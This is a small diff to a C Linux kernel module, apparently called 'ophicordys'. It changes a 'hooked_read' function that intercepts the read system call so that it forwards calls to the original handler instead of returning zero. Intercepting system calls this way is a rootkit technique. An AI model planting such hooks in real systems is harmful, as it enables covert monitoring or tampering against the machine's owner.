@@ -83,7 +83,7 @@ asmlinkage ssize_t hooked_read(unsigned int filedes, char* buf, size_t nbytes) {
     printk(KERN_INFO "%s: Intercepted read from", THIS_MODULE->name);
     #endif
 
-    return 0;
+    return real_sys_read(filedes, buf, nbytes);
 }
 
 static int __init ophicordys_init(void) {
